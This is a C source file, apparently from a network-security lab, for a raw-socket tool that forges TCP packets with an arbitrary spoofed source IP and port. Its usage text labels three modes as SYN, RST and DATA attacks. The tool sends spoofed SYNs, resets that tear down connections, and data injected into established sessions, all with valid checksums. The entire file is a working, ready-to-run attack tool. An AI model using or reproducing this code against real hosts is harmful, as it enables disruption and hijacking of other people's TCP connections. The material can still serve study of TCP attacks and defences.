#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define PCKT_LEN 8192

// --------------------- checksum helpers ---------------------
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short) ~sum;
    return answer;
}

// Pseudo-header for TCP checksum
struct pseudo_header {
    unsigned int src;
    unsigned int dst;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_len;
};

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "Usage:\n"
            "  SYN  attack: %s S <src_ip> <src_port> <dst_ip> <dst_port> <seq>\n"
            "  RST  attack: %s R <src_ip> <src_port> <dst_ip> <dst_port> <seq>\n"
            "  DATA attack: %s D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <data>\n",
            argv[0], argv[0], argv[0]);
        exit(1);
    }

    char mode = argv[1][0];

    if ((mode == 'S' || mode == 'R') && argc != 7) {
        fprintf(stderr,
            "Usage for S/R: %s %c <src_ip> <src_port> <dst_ip> <dst_port> <seq>\n",
            argv[0], mode);
        exit(1);
    }
    if (mode == 'D' && argc != 9) {
        fprintf(stderr,
            "Usage for D: %s D <src_ip> <src_port> <dst_ip> <dst_port> <seq> <ack> <data>\n",
            argv[0]);
        exit(1);
    }

    char *src_ip  = argv[2];
    int   src_port = atoi(argv[3]);
    char *dst_ip  = argv[4];
    int   dst_port = atoi(argv[5]);
    unsigned int seq = strtoul(argv[6], NULL, 10);

    unsigned int ack = 0;
    char *data = NULL;
    int payload_len = 0;

    if (mode == 'D') {
        ack = strtoul(argv[7], NULL, 10);
        data = argv[8];
        payload_len = (int)strlen(data);
    }

    // Raw socket
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) {
        perror("socket");
        exit(1);
    }

    int one = 1;
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL)");
        close(sd);
        exit(1);
    }

    char packet[PCKT_LEN];
    memset(packet, 0, sizeof(packet));

    struct iphdr  *ip  = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *payload      = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));

    if (mode == 'D' && payload_len > 0) {
        memcpy(payload, data, payload_len);
    }

    // --------------------- IP header ---------------------
    ip->ihl      = 5;
    ip->version  = 4;
    ip->tos      = 0;
    ip->tot_len  = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id       = htons(54321);
    ip->frag_off = 0;
    ip->ttl      = 64;
    ip->protocol = IPPROTO_TCP;
    ip->check    = 0;
    ip->saddr    = inet_addr(src_ip);
    ip->daddr    = inet_addr(dst_ip);

    // --------------------- TCP header ---------------------
    tcp->source  = htons(src_port);
    tcp->dest    = htons(dst_port);
    tcp->seq     = htonl(seq);
    tcp->ack_seq = (mode == 'D') ? htonl(ack) : 0;
    tcp->doff    = 5;
    tcp->fin = tcp->syn = tcp->rst = tcp->urg = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->window  = htons(65535);
    tcp->check   = 0;
    tcp->urg_ptr = 0;

    if (mode == 'S') {
        // SYN attack (no payload)
        tcp->syn = 1;
    } else if (mode == 'R') {
        // RST attack (as in fake_rst.c: pure RST, no ACK)
        tcp->rst = 1;
        tcp->window = htons(0);
    } else if (mode == 'D') {
        // Data injection (as in fake_inject.c)
        tcp->psh = 1;
        tcp->ack = 1;
    } else {
        fprintf(stderr, "Unknown mode '%c'\n", mode);
        close(sd);
        exit(1);
    }

    // --------------------- TCP checksum (pseudo-header) ---------------------
    struct pseudo_header psh;
    psh.src      = ip->saddr;
    psh.dst      = ip->daddr;
    psh.zero     = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len  = htons(sizeof(struct tcphdr) + payload_len);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
    char *pseudogram = malloc(psize);
    if (!pseudogram) {
        perror("malloc");
        close(sd);
        exit(1);
    }

    memcpy(pseudogram, &psh, sizeof(psh));
    memcpy(pseudogram + sizeof(psh), tcp, sizeof(struct tcphdr) + payload_len);

    tcp->check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    // --------------------- IP checksum ---------------------
    ip->check = checksum((unsigned short *)packet, ip->ihl * 4);

    // --------------------- send ---------------------
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(dst_port);
    sin.sin_addr.s_addr = ip->daddr;

    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
    if (sendto(sd, packet, packet_len, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
    } else {
        if (mode == 'S') {
            printf("Spoofed SYN sent: %s:%d -> %s:%d  seq=%u\n",
                   src_ip, src_port, dst_ip, dst_port, seq);
        } else if (mode == 'R') {
            printf("Spoofed RST sent: %s:%d -> %s:%d  seq=%u\n",
                   src_ip, src_port, dst_ip, dst_port, seq);
        } else {
            printf("Spoofed DATA sent: %s:%d -> %s:%d  seq=%u ack=%u (%d bytes payload)\n",
                   src_ip, src_port, dst_ip, dst_port, seq, ack, payload_len);
        }
    }

    close(sd);
    return 0;
}
